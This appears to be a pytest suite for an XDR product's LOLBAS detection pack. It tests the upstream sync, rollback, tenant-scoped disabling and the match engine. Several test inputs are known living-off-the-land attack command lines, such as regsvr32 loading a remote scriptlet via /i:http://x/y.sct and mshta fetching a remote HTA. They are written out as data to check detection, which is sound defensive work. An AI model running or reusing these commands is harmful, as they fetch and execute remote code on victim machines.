"""XDR LOLBAS Content Pack — Phase A pytest.

Runs the full 10-stage sync pipeline against a pinned upstream
fixture (`fixtures/lolbas_snapshot.json`) so tests are deterministic
and offline.  Guards all invariants the user's directive demands.
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

os.environ.setdefault("XDR_AUDIT_MASTER_SECRET", "test-master-secret")
os.environ.setdefault("XDR_SECRETS_MASTER", "test-secrets-master-passphrase")
_FIXTURE = Path(__file__).resolve().parents[1] / "fixtures" / "lolbas_snapshot.json"
FIXTURE_URL = f"file://{_FIXTURE.as_posix()}"

from routers import xdr_audit_log as al
from routers import xdr_lolbas as lb
from server import app

client = TestClient(app)

TEN = "lolbas-test-tenant"


def _hdrs(**extra):
    h = {"X-Tenant-Id": TEN, "X-Principal-Id": "tester@nivxray",
             "X-Principal-Kind": "user"}
    h.update(extra); return h


@pytest.fixture(scope="module", autouse=True)
def _clean_slate():
    if lb._entries()    is not None: lb._entries().delete_many({})
    if lb._primitives() is not None: lb._primitives().delete_many({})
    if lb._versions()   is not None: lb._versions().delete_many({})
    if al._get_coll()   is not None:
        al._get_coll().delete_many({"tenant_id": TEN})
    yield


def _skip_if_no_mongo():
    if lb._db() is None:
        pytest.skip("MONGO_URL not configured")


# ── 1 · Sync completes end-to-end and hits 100 % ──────────────────
def test_sync_reaches_complete_100pct():
    _skip_if_no_mongo()
    assert _FIXTURE.exists(), f"fixture missing: {_FIXTURE}"

    r = client.post(f"/api/xdr/lolbas/sync?url={FIXTURE_URL}",
                          headers=_hdrs())
    assert r.status_code == 200, r.text
    v = r.json()["data"]
    # Outcome + coverage
    assert v["outcome"] == "COMPLETE", v["stages"]
    assert v["upstream_count"] > 0
    assert v["imported"] == v["upstream_count"], v
    assert v["invalid"] == 0, v["stages"]["VALIDATED"]
    assert v["coverage_pct"] == 100.0
    # Every stage OK
    for s in ["DISCOVERED", "DOWNLOADED", "PARSED", "VALIDATED",
                    "NORMALIZED", "INDEXED", "PRIMITIVES_GENERATED",
                    "ATTACK_MAPPED", "REGRESSION_TESTED", "COMPLETE"]:
        assert v["stages"][s]["status"] == "OK", (s, v["stages"][s])
    # Provenance + license present
    assert v["source"].startswith("LOLBAS Project")
    assert "Creative Commons" in v["license"]
    assert v["upstream_sha256"] and len(v["upstream_sha256"]) == 64
    assert v["upstream_version"].startswith("sha256:")


# ── 2 · Entries are persisted and full upstream data preserved ────
def test_entries_persisted_with_full_upstream():
    _skip_if_no_mongo()
    r = client.get("/api/xdr/lolbas/entries?q=regsvr32", headers=_hdrs())
    assert r.status_code == 200
    entries = r.json()["data"]["entries"]
    assert any(e["name"].lower().startswith("regsvr32") for e in entries)
    # Detail preserves upstream raw fields.
    name = next(e["name"] for e in entries
                     if e["name"].lower().startswith("regsvr32"))
    r2 = client.get(f"/api/xdr/lolbas/entries/{name}", headers=_hdrs())
    d = r2.json()["data"]
    assert d["name"] == name
    assert d["commands"] and isinstance(d["commands"], list)
    assert d["paths"] and isinstance(d["paths"], list)
    assert d["mitre_ids"], "MITRE mapping missing for regsvr32"
    assert d["primitives_count"] > 0
    assert d["raw_upstream"]["Name"] == name  # untouched upstream retained


# ── 3 · Primitives generated for every entry, with expected kinds ─
def test_primitives_generated_and_indexed():
    _skip_if_no_mongo()
    r = client.get("/api/xdr/lolbas/primitives", headers=_hdrs())
    assert r.status_code == 200
    d = r.json()["data"]
    assert d["total"] > 100
    r2 = client.get("/api/xdr/lolbas/primitives?kind=lolbin.image",
                             headers=_hdrs())
    assert r2.json()["data"]["total"] > 0
    r3 = client.get("/api/xdr/lolbas/primitives?kind=attack.technique",
                             headers=_hdrs())
    assert r3.json()["data"]["total"] > 0


# ── 4 · Match engine returns evidence hits for known LOLBIN abuse ─
def test_match_engine_detects_regsvr32_abuse():
    _skip_if_no_mongo()
    r = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
                          json={"image": "regsvr32.exe",
                                    "command_line": "regsvr32.exe /s /u /i:http://x/y.sct scrobj.dll"})
    assert r.status_code == 200
    hits = r.json()["data"]["hits"]
    assert len(hits) >= 1
    kinds = {h["kind"] for h in hits}
    assert "lolbin.image" in kinds or "lolbin.argument" in kinds
    # Contract: never returns a verdict.
    assert "verdict" not in r.json()["data"]


def test_match_engine_detects_mshta_abuse():
    _skip_if_no_mongo()
    r = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
                          json={"image": "mshta.exe",
                                    "command_line": "mshta http://x/y.hta"})
    hits = r.json()["data"]["hits"]
    assert any(h["entry_name"].lower().startswith("mshta") for h in hits)


def test_parent_child_tier_normal_suspicious_abnormal():
    """Every LOLBIN with parent-child registry emits normal/suspicious/
    abnormal primitives; the match engine surfaces the tier."""
    _skip_if_no_mongo()
    # Suspicious: Office → PowerShell.
    r_sus = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
                                       json={"image": "powershell.exe",
                                                 "parent_image": "winword.exe",
                                                 "command_line": "powershell -enc AAA"})
    hits = r_sus.json()["data"]["hits"]
    pc = [h for h in hits if h["kind"] == "lolbin.parent_child"]
    assert pc, "no parent-child hit for winword.exe -> powershell.exe"
    assert any(h.get("tier") == "suspicious" for h in pc)

    # Abnormal: mshta.exe → powershell.exe (LOLBIN-from-LOLBIN).
    r_ab = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
                                     json={"image": "powershell.exe",
                                               "parent_image": "mshta.exe"})
    hits2 = r_ab.json()["data"]["hits"]
    pc2 = [h for h in hits2 if h["kind"] == "lolbin.parent_child"]
    assert pc2 and any(h.get("tier") == "abnormal" for h in pc2)

    # Normal: explorer.exe → powershell.exe (interactive session).
    r_nl = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
                                     json={"image": "powershell.exe",
                                               "parent_image": "explorer.exe"})
    hits3 = r_nl.json()["data"]["hits"]
    pc3 = [h for h in hits3 if h["kind"] == "lolbin.parent_child"]
    assert pc3 and any(h.get("tier") == "normal" for h in pc3)


# ── 5 · Idempotency — a re-sync from the same source is a no-op diff ─
def test_second_sync_is_idempotent():
    _skip_if_no_mongo()
    entries_before = lb._entries().count_documents({})
    r = client.post(f"/api/xdr/lolbas/sync?url={FIXTURE_URL}", headers=_hdrs())
    assert r.status_code == 200
    v = r.json()["data"]
    assert v["outcome"] == "COMPLETE"
    assert v["diff"]["added"] == []
    assert v["diff"]["removed"] == []
    entries_after = lb._entries().count_documents({})
    assert entries_before == entries_after


# ── 6 · Removal detection — synthetic short fixture drops old entries ─
def test_removal_detected_and_handled_safely(tmp_path):
    _skip_if_no_mongo()
    small = tmp_path / "small.json"
    # Use one legit entry from the real fixture so validation passes.
    import json
    src = json.loads(_FIXTURE.read_text())
    small.write_text(json.dumps([src[0]]))
    r = client.post(f"/api/xdr/lolbas/sync?url=file://{small}",
                          headers=_hdrs())
    v = r.json()["data"]
    # A one-entry upstream is deliberately NOT marked COMPLETE — the
    # regression gate requires known LOLBIN targets (regsvr32, mshta,
    # rundll32, msiexec, certutil) to be indexed.  This is the exact
    # anti-hallucination guarantee the user demanded.
    assert v["outcome"] == "PARTIAL"
    assert v["upstream_count"] == 1
    assert v["imported"] == 1
    assert v["invalid"] == 0
    assert len(v["diff"]["removed"]) > 0, "removed diff must be captured"
    assert v["stages"]["REGRESSION_TESTED"]["status"] == "FAIL"
    # Re-sync back to the full fixture to restore the pack for the
    # remaining tests.
    client.post(f"/api/xdr/lolbas/sync?url={FIXTURE_URL}", headers=_hdrs())


# ── 7 · Upstream unavailable → last known active version retained ─
def test_upstream_unavailable_leaves_active_pack_intact():
    _skip_if_no_mongo()
    # Snapshot current active version id.
    before = lb._versions().find_one({"active": True})
    assert before is not None
    r = client.post("/api/xdr/lolbas/sync?url=file:///nonexistent.json",
                          headers=_hdrs())
    v = r.json()["data"]
    assert v["outcome"] == "UPSTREAM_UNAVAILABLE"
    assert v["stages"]["DOWNLOADED"]["status"] == "FAIL"
    after = lb._versions().find_one({"active": True})
    assert after is not None
    assert after["id"] == before["id"], "active pack must not change on upstream failure"


# ── 8 · Rollback restores a previous COMPLETE version ────────────
def test_rollback_flips_active_flag():
    _skip_if_no_mongo()
    versions = lb._versions().find({"outcome": "COMPLETE"},
                                                    {"_id": 0, "id": 1}).sort("synced_at", 1)
    ids = [v["id"] for v in versions]
    assert len(ids) >= 2, "need at least two COMPLETE syncs"
    r = client.post(f"/api/xdr/lolbas/rollback/{ids[0]}", headers=_hdrs())
    assert r.status_code == 200
    active = lb._versions().find_one({"active": True}, {"_id": 0})
    assert active["id"] == ids[0]
    # Restore latest to leave state consistent.
    client.post(f"/api/xdr/lolbas/rollback/{ids[-1]}", headers=_hdrs())


# ── 9 · Disable / enable is tenant-scoped and audit-tracked ──────
def test_disable_entry_hides_from_match_for_tenant():
    _skip_if_no_mongo()
    # Pick regsvr32 (real match) and disable it.
    row = lb._entries().find_one(
        {"name": {"$regex": "^Regsvr32", "$options": "i"}})
    assert row is not None
    name = row["name"]
    client.post(f"/api/xdr/lolbas/entries/{name}/disable", headers=_hdrs())
    r = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
                          json={"image": "regsvr32.exe",
                                    "command_line": "regsvr32.exe /s /u /i:http://x/y.sct scrobj.dll"})
    hits = r.json()["data"]["hits"]
    assert not any(h["entry_name"] == name for h in hits), \
        "disabled entry must not appear in tenant matches"
    # A different tenant STILL sees it.
    r2 = client.post("/api/xdr/lolbas/match",
                              headers={"X-Tenant-Id": "other-tenant"},
                              json={"image": "regsvr32.exe",
                                        "command_line": "regsvr32.exe /s /u /i:http://x/y.sct scrobj.dll"})
    hits2 = r2.json()["data"]["hits"]
    assert any(h["entry_name"] == name for h in hits2)
    # Re-enable.
    client.post(f"/api/xdr/lolbas/entries/{name}/enable", headers=_hdrs())


# ── 10 · Status + Coverage endpoints expose honest numbers ───────
def test_status_and_coverage_endpoints():
    _skip_if_no_mongo()
    r = client.get("/api/xdr/lolbas/status", headers=_hdrs())
    d = r.json()["data"]
    assert d["entries_total"] > 0
    assert d["primitives_total"] > 0
    assert d["source"].startswith("LOLBAS Project")
    r2 = client.get("/api/xdr/lolbas/coverage", headers=_hdrs())
    c = r2.json()["data"]
    assert c["coverage_pct"] == 100.0
    assert c["invalid"] == 0
    assert c["upstream_count"] == c["imported"]


# ── 11 · Audit chain captures every sync + entry mutation ────────
def test_audit_chain_captured_sync_and_mutations():
    _skip_if_no_mongo()
    r = client.get("/api/xdr/audit-log?action=LOLBAS_SYNCED",
                          headers=_hdrs())
    events = r.json()["data"]["events"]
    assert len(events) >= 1
    # Chain must remain valid across all activity.
    r2 = client.get("/api/xdr/audit-log/verify/chain", headers=_hdrs())
    assert r2.json()["data"]["status"] == "valid", r2.json()


# ── 12 · Completeness gate — MUST fail loudly on tampered upstream ─
def test_pipeline_fails_on_malformed_upstream(tmp_path):
    _skip_if_no_mongo()
    bad = tmp_path / "bad.json"
    bad.write_text('{"not":"a-list"}')
    r = client.post(f"/api/xdr/lolbas/sync?url=file://{bad}",
                          headers=_hdrs())
    v = r.json()["data"]
    assert v["outcome"] == "PARSE_FAILED"
    assert v["stages"]["PARSED"]["status"] == "FAIL"
    # Restore.
    client.post(f"/api/xdr/lolbas/sync?url={FIXTURE_URL}", headers=_hdrs())
